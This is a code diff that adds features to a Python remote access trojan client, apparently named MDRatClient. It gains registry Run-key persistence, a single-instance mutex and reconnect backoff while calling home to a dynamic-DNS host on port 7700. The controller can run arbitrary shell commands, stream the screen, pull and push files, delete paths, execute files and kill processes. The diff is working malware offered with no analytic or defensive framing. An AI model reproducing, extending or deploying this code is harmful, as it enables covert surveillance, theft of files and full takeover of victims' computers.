@@ -7,11 +7,100 @@ import base64
 import threading
 import time
 import subprocess
+import sys
+import winreg
 from PIL import Image, ImageGrab
 import io
 
 SERVER_IP = "updatesys.duckdns.org"
 SERVER_PORT = 7700
+
+CHUNK_SIZE = 512 * 1024
+CHUNK_THRESHOLD = 1024 * 1024
+
+def unique_filepath(path):
+    if not os.path.exists(path):
+        return path
+    dirname = os.path.dirname(path)
+    basename = os.path.basename(path)
+    base, ext = os.path.splitext(basename)
+    n = 1
+    while True:
+        new_name = f"{base} ({n}){ext}"
+        new_path = os.path.join(dirname, new_name)
+        if not os.path.exists(new_path):
+            return new_path
+        n += 1
+
+def already_running():
+    if sys.platform != "win32":
+        return False
+    try:
+        import ctypes
+        kernel32 = ctypes.windll.kernel32
+        ERROR_ALREADY_EXISTS = 183
+        mutex_name = "Global\\MDRatClient_SingleInstance"
+        handle = kernel32.CreateMutexW(None, True, mutex_name)
+        if handle is None:
+            return False
+        err = kernel32.GetLastError()
+        if err == ERROR_ALREADY_EXISTS:
+            kernel32.CloseHandle(handle)
+            return True
+        return False
+    except Exception:
+        return False
+
+def add_to_startup():
+    try:
+        if getattr(sys, 'frozen', False):
+            current_file = sys.executable
+        else:
+            current_file = os.path.abspath(__file__)
+        
+        key_name = "MDRatClient"
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        
+        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, current_file)
+        
+        winreg.CloseKey(key)
+        
+        return True
+        
+    except Exception as e:
+        return False
+
+def check_startup():
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key_name = "MDRatClient"
+        
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_READ)
+        
+        try:
+            value, _ = winreg.QueryValueEx(key, key_name)
+            winreg.CloseKey(key)
+            
+            current_file = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
+            
+            if value == current_file:
+                return True
+            else:
+                return False
+                
+        except FileNotFoundError:
+            winreg.CloseKey(key)
+            return False
+            
+    except Exception as e:
+        return False
+
+def ensure_startup():
+    if not check_startup():
+        return add_to_startup()
+    return True
 
 def get_info():
     return {
@@ -20,215 +109,345 @@ def get_info():
         "os": platform.platform()
     }
 
+RECONNECT_DELAYS = [5, 10, 30, 60]
+
 def connect():
+    ensure_startup()
+    delay_index = 0
+    
     while True:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((SERVER_IP, SERVER_PORT))
-            
-            # Send info
+            delay_index = 0
             sock.send(json.dumps(get_info()).encode())
             
             current_dir = os.path.expanduser("~")
+            streaming_active = False
+            recv_buffer = b""
+            current_upload = None
             
-            # Receive commands
             while True:
-                data = sock.recv(1024*1024)
-                if not data:
+                chunk = sock.recv(256 * 1024)
+                if not chunk:
                     break
+                recv_buffer += chunk
+                while b"{" in recv_buffer:
+                    try:
+                        first = recv_buffer.find(b"{")
+                        brace_count = 0
+                        end = -1
+                        for i in range(first, len(recv_buffer)):
+                            if recv_buffer[i:i+1] == b"{":
+                                brace_count += 1
+                            elif recv_buffer[i:i+1] == b"}":
+                                brace_count -= 1
+                                if brace_count == 0:
+                                    end = i + 1
+                                    break
+                        if end == -1:
+                            break
+                        json_bytes = recv_buffer[first:end]
+                        recv_buffer = recv_buffer[end:]
+                        command = json.loads(json_bytes.decode())
+                    except (json.JSONDecodeError, ValueError):
+                        break
                     
-                try:
-                    command = json.loads(data.decode())
-                    
-                    if command["action"] == "upload_file":
-                        # Save file to desktop
-                        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
-                        filepath = os.path.join(desktop, command["filename"])
-                        
-                        # Decode and save
-                        file_data = base64.b64decode(command["data"])
-                        with open(filepath, "wb") as f:
-                            f.write(file_data)
-                    
-                    elif command["action"] == "screenshot":
-                        # Capture screenshot
-                        try:
-                            screenshot = ImageGrab.grab()
-                            img_buffer = io.BytesIO()
-                            screenshot.save(img_buffer, format='PNG')
-                            img_data = base64.b64encode(img_buffer.getvalue()).decode()
-                            
-                            response = {
-                                "action": "screenshot_data",
-                                "image": img_data,
-                                "width": screenshot.width,
-                                "height": screenshot.height
-                            }
-                            sock.send(json.dumps(response).encode())
-                            
-                        except Exception as e:
-                            response = {
-                                "action": "screenshot_error",
-                                "error": f"Screenshot failed: {str(e)}"
-                            }
-                            sock.send(json.dumps(response).encode())
-                    
-                    elif command["action"] == "start_screen":
-                        # Start screen streaming
-                        streaming_active = True
-                        selected_quality = command.get("quality", "medium")
-                        
-                        def stream_screen(quality):
-                            nonlocal streaming_active
+                    try:
+                        if command["action"] == "ping":
+                            sock.send(json.dumps({"action": "pong"}).encode())
+                        elif command["action"] == "upload_file":
+                            target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
+                            target_dir = os.path.abspath(os.path.expanduser(target_dir))
+                            filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
                             try:
-                                # Set quality parameters
-                                if quality == "low":
-                                    quality_param = (800, 600)
-                                    jpeg_quality = 70
-                                    fps_delay = 0.05  # 20 FPS
-                                elif quality == "high":
-                                    # Use native resolution or high HD
-                                    quality_param = (1920, 1080) 
-                                    jpeg_quality = 95
-                                    fps_delay = 0.033  # 30 FPS
-                                else:  # medium
-                                    quality_param = (1280, 720)
-                                    jpeg_quality = 85
-                                    fps_delay = 0.05  # 20 FPS
-                                
-                                while streaming_active:
-                                    try:
-                                        start_time = time.time()
-                                        
-                                        # Capture screenshot
-                                        screenshot = ImageGrab.grab()
-                                        
-                                        # Resize only if necessary to save CPU
-                                        if quality != "high":
-                                            screenshot = screenshot.resize(quality_param, Image.Resampling.BILINEAR)
-                                        
-                                        # Compress and encode with high performance settings
-                                        img_buffer = io.BytesIO()
-                                        screenshot.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
-                                        img_data = base64.b64encode(img_buffer.getvalue()).decode()
-                                        
-                                        # Send response
-                                        response = {
-                                            "action": "screen_data",
-                                            "image": img_data,
-                                            "width": screenshot.width,
-                                            "height": screenshot.height
-                                        }
-                                        sock.send(json.dumps(response).encode())
-                                        
-                                        # Calculate remaining time for consistent FPS
-                                        elapsed = time.time() - start_time
-                                        sleep_time = max(0, fps_delay - elapsed)
-                                        time.sleep(sleep_time)
-                                        
-                                    except Exception as e:
-                                        if streaming_active:
-                                            error_response = {
-                                                "action": "screen_error",
-                                                "error": f"Streaming error: {str(e)}"
-                                            }
-                                            try:
-                                                sock.send(json.dumps(error_response).encode())
-                                            except:
-                                                pass
-                                        break
-                                        
+                                os.makedirs(target_dir, exist_ok=True)
+                                file_data = base64.b64decode(command["data"])
+                                with open(filepath, "wb") as f:
+                                    f.write(file_data)
                             except Exception as e:
-                                error_response = {
-                                    "action": "screen_error", 
-                                    "error": f"Failed to start streaming: {str(e)}"
-                                }
+                                sock.send(json.dumps({"action": "file_error", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "upload_start":
+                            if current_upload:
                                 try:
-                                    sock.send(json.dumps(error_response).encode())
+                                    current_upload["f"].close()
                                 except:
                                     pass
+                            target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
+                            target_dir = os.path.abspath(os.path.expanduser(target_dir))
+                            filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
+                            try:
+                                os.makedirs(target_dir, exist_ok=True)
+                                f = open(filepath, "wb")
+                                current_upload = {"f": f, "path": filepath, "total": command.get("total", 0), "received": 0}
+                                sock.send(json.dumps({"action": "upload_chunk_ack"}).encode())
+                            except Exception as e:
+                                current_upload = None
+                                sock.send(json.dumps({"action": "file_error", "error": str(e)}).encode())
                         
-                        # Start streaming in separate thread with quality parameter
-                        streaming_thread = threading.Thread(target=stream_screen, args=(selected_quality,), daemon=True)
-                        streaming_thread.start()
-                    
-                    elif command["action"] == "stop_screen":
-                        # Stop screen streaming
-                        streaming_active = False
-                    
-                    elif command["action"] == "execute_cmd":
-                        cmd_to_execute = command["command"].strip()
+                        elif command["action"] == "upload_chunk":
+                            if current_upload:
+                                try:
+                                    data = base64.b64decode(command["data"])
+                                    current_upload["f"].write(data)
+                                    current_upload["received"] += len(data)
+                                    sock.send(json.dumps({"action": "upload_progress", "received": current_upload["received"], "total": current_upload["total"]}).encode())
+                                except Exception as e:
+                                    sock.send(json.dumps({"action": "file_error", "error": str(e)}).encode())
                         
-                        try:
-                            lower = cmd_to_execute.lower()
-                            if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd.."):
-                                target = None
-                                if lower == "cd" or lower == "cd~":
-                                    target = os.path.expanduser("~")
-                                elif lower == "cd.." or lower == "cd ..":
-                                    target = os.path.abspath(os.path.join(current_dir, ".."))
-                                elif lower.startswith("cd.."):
-                                    target = os.path.abspath(os.path.join(current_dir, ".."))
+                        elif command["action"] == "upload_end":
+                            if current_upload:
+                                try:
+                                    current_upload["f"].close()
+                                    sock.send(json.dumps({"action": "upload_done", "error": ""}).encode())
+                                except Exception as e:
+                                    sock.send(json.dumps({"action": "upload_done", "error": str(e)}).encode())
+                                current_upload = None
+                        
+                        elif command["action"] == "list_dir":
+                            path = command.get("path", os.path.expanduser("~"))
+                            path = os.path.abspath(os.path.expanduser(path))
+                            try:
+                                if not os.path.isdir(path):
+                                    sock.send(json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": "Not a directory"}).encode())
                                 else:
-                                    path = cmd_to_execute[3:].strip()
-                                    if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
-                                        path = path[1:-1]
-                                    path = os.path.expanduser(path)
-                                    target = path if os.path.isabs(path) else os.path.abspath(os.path.join(current_dir, path))
-                                if target and os.path.isdir(target):
-                                    current_dir = target
-                                    response = {
-                                        "action": "cmd_output",
-                                        "output": current_dir + "\n",
-                                        "error": ""
-                                    }
+                                    entries = []
+                                    for name in os.listdir(path):
+                                        full = os.path.join(path, name)
+                                        try:
+                                            is_dir = os.path.isdir(full)
+                                            size = os.path.getsize(full) if not is_dir else 0
+                                            entries.append({"name": name, "is_dir": is_dir, "size": size})
+                                        except OSError:
+                                            entries.append({"name": name, "is_dir": False, "size": -1})
+                                    sock.send(json.dumps({"action": "list_dir_result", "path": path, "entries": entries, "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "list_dir_result", "path": path, "entries": [], "error": str(e)}).encode())
+                        
+                        elif command["action"] == "get_file":
+                            path = command.get("path", "")
+                            path = os.path.abspath(os.path.expanduser(path))
+                            try:
+                                if not os.path.isfile(path):
+                                    sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode())
                                 else:
-                                    response = {
-                                        "action": "cmd_output",
-                                        "output": "",
-                                        "error": "The system cannot find the path specified."
-                                    }
+                                    total_size = os.path.getsize(path)
+                                    filename = os.path.basename(path)
+                                    if total_size > CHUNK_THRESHOLD:
+                                        sock.send(json.dumps({"action": "get_file_start", "filename": filename, "size": total_size, "error": ""}).encode())
+                                        with open(path, "rb") as f:
+                                            idx = 0
+                                            while True:
+                                                chunk = f.read(CHUNK_SIZE)
+                                                if not chunk:
+                                                    break
+                                                sock.send(json.dumps({"action": "get_file_chunk", "index": idx, "data": base64.b64encode(chunk).decode()}).encode())
+                                                idx += 1
+                                        sock.send(json.dumps({"action": "get_file_end", "error": ""}).encode())
+                                    else:
+                                        with open(path, "rb") as f:
+                                            data = base64.b64encode(f.read()).decode()
+                                        sock.send(json.dumps({"action": "file_data", "path": path, "filename": filename, "data": data, "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "create_folder":
+                            path = command.get("path", "")
+                            path = os.path.abspath(os.path.expanduser(path))
+                            try:
+                                os.makedirs(path, exist_ok=True)
+                                sock.send(json.dumps({"action": "create_folder_result", "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "create_folder_result", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "delete_path":
+                            path = command.get("path", "")
+                            path = os.path.abspath(os.path.expanduser(path))
+                            try:
+                                if os.path.isfile(path):
+                                    os.remove(path)
+                                elif os.path.isdir(path):
+                                    import shutil
+                                    shutil.rmtree(path)
+                                else:
+                                    sock.send(json.dumps({"action": "delete_path_result", "error": "Not found"}).encode())
+                                    continue
+                                sock.send(json.dumps({"action": "delete_path_result", "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "delete_path_result", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "get_process_list":
+                            try:
+                                import csv
+                                r = subprocess.run(
+                                    ["tasklist", "/fo", "csv", "/nh"],
+                                    capture_output=True, text=True, timeout=15, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+                                )
+                                processes = []
+                                for row in csv.reader((r.stdout or "").strip().splitlines()):
+                                    if len(row) >= 2:
+                                        name, pid = row[0].strip(), row[1].strip()
+                                        try:
+                                            int(pid)
+                                            processes.append({"pid": pid, "name": name})
+                                        except ValueError:
+                                            pass
+                                sock.send(json.dumps({"action": "process_list", "processes": processes, "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "process_list", "processes": [], "error": str(e)}).encode())
+                        
+                        elif command["action"] == "kill_process":
+                            pid = command.get("pid")
+                            try:
+                                pid = int(pid)
+                                if sys.platform == "win32":
+                                    subprocess.run(["taskkill", "/F", "/PID", str(pid)], capture_output=True, timeout=5, creationflags=subprocess.CREATE_NO_WINDOW)
+                                else:
+                                    os.kill(pid, 9)
+                                sock.send(json.dumps({"action": "kill_process_result", "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "kill_process_result", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "screenshot":
+                            try:
+                                screenshot = ImageGrab.grab()
+                                img_buffer = io.BytesIO()
+                                screenshot.save(img_buffer, format='PNG')
+                                img_data = base64.b64encode(img_buffer.getvalue()).decode()
+                                response = {
+                                    "action": "screenshot_data",
+                                    "image": img_data,
+                                    "width": screenshot.width,
+                                    "height": screenshot.height
+                                }
                                 sock.send(json.dumps(response).encode())
-                                continue
-                            result = subprocess.run(
-                                cmd_to_execute,
-                                shell=True,
-                                capture_output=True,
-                                text=True,
-                                timeout=30,
-                                cwd=current_dir
-                            )
-                            
-                            # Prepare response
-                            response = {
-                                "action": "cmd_output",
-                                "output": result.stdout if result.stdout else "",
-                                "error": result.stderr if result.stderr else ""
-                            }
-                            
-                            # Send response back
-                            sock.send(json.dumps(response).encode())
-                            
-                        except subprocess.TimeoutExpired:
-                            response = {
-                                "action": "cmd_output",
-                                "output": "",
-                                "error": "Command timeout (30 seconds)"
-                            }
-                            sock.send(json.dumps(response).encode())
-                        except Exception as e:
-                            response = {
-                                "action": "cmd_output",
-                                "output": "",
-                                "error": str(e)
-                            }
-                            sock.send(json.dumps(response).encode())
-                            
-                except:
-                    pass
+                            except Exception as e:
+                                response = {"action": "screenshot_error", "error": f"Screenshot failed: {str(e)}"}
+                                sock.send(json.dumps(response).encode())
+                        
+                        elif command["action"] == "start_screen":
+                            streaming_active = True
+                            selected_quality = command.get("quality", "medium")
+                            def stream_screen(quality):
+                                nonlocal streaming_active
+                                try:
+                                    if quality == "low":
+                                        quality_param = (800, 600)
+                                        jpeg_quality = 70
+                                        fps_delay = 0.05
+                                    elif quality == "high":
+                                        quality_param = (1920, 1080)
+                                        jpeg_quality = 95
+                                        fps_delay = 0.033
+                                    else:
+                                        quality_param = (1280, 720)
+                                        jpeg_quality = 85
+                                        fps_delay = 0.05
+                                    while streaming_active:
+                                        try:
+                                            start_time = time.time()
+                                            screenshot = ImageGrab.grab()
+                                            if quality != "high":
+                                                screenshot = screenshot.resize(quality_param, Image.Resampling.BILINEAR)
+                                            img_buffer = io.BytesIO()
+                                            screenshot.save(img_buffer, format='JPEG', quality=jpeg_quality, optimize=False)
+                                            img_data = base64.b64encode(img_buffer.getvalue()).decode()
+                                            response = {
+                                                "action": "screen_data",
+                                                "image": img_data,
+                                                "width": screenshot.width,
+                                                "height": screenshot.height
+                                            }
+                                            sock.send(json.dumps(response).encode())
+                                            elapsed = time.time() - start_time
+                                            sleep_time = max(0, fps_delay - elapsed)
+                                            time.sleep(sleep_time)
+                                        except Exception as e:
+                                            if streaming_active:
+                                                try:
+                                                    sock.send(json.dumps({"action": "screen_error", "error": str(e)}).encode())
+                                                except:
+                                                    pass
+                                            break
+                                except Exception as e:
+                                    try:
+                                        sock.send(json.dumps({"action": "screen_error", "error": str(e)}).encode())
+                                    except:
+                                        pass
+                            streaming_thread = threading.Thread(target=stream_screen, args=(selected_quality,), daemon=True)
+                            streaming_thread.start()
+                        
+                        elif command["action"] == "stop_screen":
+                            streaming_active = False
+                        
+                        elif command["action"] == "execute_file":
+                            path = command.get("path", "")
+                            path = os.path.abspath(os.path.expanduser(path))
+                            try:
+                                if not os.path.isfile(path):
+                                    sock.send(json.dumps({"action": "execute_result", "error": "Not a file or not found"}).encode())
+                                else:
+                                    if sys.platform == "win32":
+                                        os.startfile(path)
+                                    else:
+                                        subprocess.Popen([path], shell=True)
+                                    sock.send(json.dumps({"action": "execute_result", "error": ""}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "execute_result", "error": str(e)}).encode())
+                        
+                        elif command["action"] == "execute_cmd":
+                            cmd_to_execute = command["command"].strip()
+                            cmd_timeout = command.get("timeout", 300)
+                            try:
+                                lower = cmd_to_execute.lower().strip()
+                                if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd..") or "cd /d" in lower or "cd \\d" in lower:
+                                    target = None
+                                    if lower == "cd" or lower == "cd~":
+                                        target = os.path.expanduser("~")
+                                    elif lower == "cd.." or lower == "cd ..":
+                                        target = os.path.abspath(os.path.join(current_dir, ".."))
+                                    elif lower.startswith("cd.."):
+                                        target = os.path.abspath(os.path.join(current_dir, ".."))
+                                    elif "/d" in lower or "\\d" in lower:
+                                        parts = cmd_to_execute[2:].strip().lstrip("/\\").strip().split(None, 1)
+                                        drive = (parts[0] or "").rstrip(":")
+                                        if drive and len(drive) == 1:
+                                            target = os.path.abspath(drive + ":\\")
+                                            if len(parts) > 1:
+                                                rest = parts[1].strip().strip('"\'')
+                                                target = os.path.abspath(os.path.join(target, rest))
+                                        else:
+                                            target = None
+                                    else:
+                                        path = cmd_to_execute[3:].strip()
+                                        if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
+                                            path = path[1:-1]
+                                        path = os.path.expanduser(path)
+                                        target = path if os.path.isabs(path) else os.path.abspath(os.path.join(current_dir, path))
+                                    if target and os.path.isdir(target):
+                                        current_dir = target
+                                        response = {"action": "cmd_output", "output": current_dir + "\n", "error": ""}
+                                    else:
+                                        response = {"action": "cmd_output", "output": "", "error": "The system cannot find the path specified."}
+                                    sock.send(json.dumps(response).encode())
+                                    continue
+                                result = subprocess.run(cmd_to_execute, shell=True, capture_output=True, text=True, timeout=cmd_timeout, cwd=current_dir)
+                                response = {"action": "cmd_output", "output": result.stdout or "", "error": result.stderr or ""}
+                                sock.send(json.dumps(response).encode())
+                            except subprocess.TimeoutExpired:
+                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": f"Command timeout ({cmd_timeout} seconds)"}).encode())
+                            except Exception as e:
+                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": str(e)}).encode())
+                    except Exception as e:
+                        pass
                     
-        except:
-            time.sleep(5)  # Retry after 5 seconds
+        except Exception as e:
+            delay = RECONNECT_DELAYS[min(delay_index, len(RECONNECT_DELAYS) - 1)]
+            time.sleep(delay)
+            delay_index += 1
 
 if __name__ == "__main__":
+    if already_running():
+        sys.exit(0)
     connect()
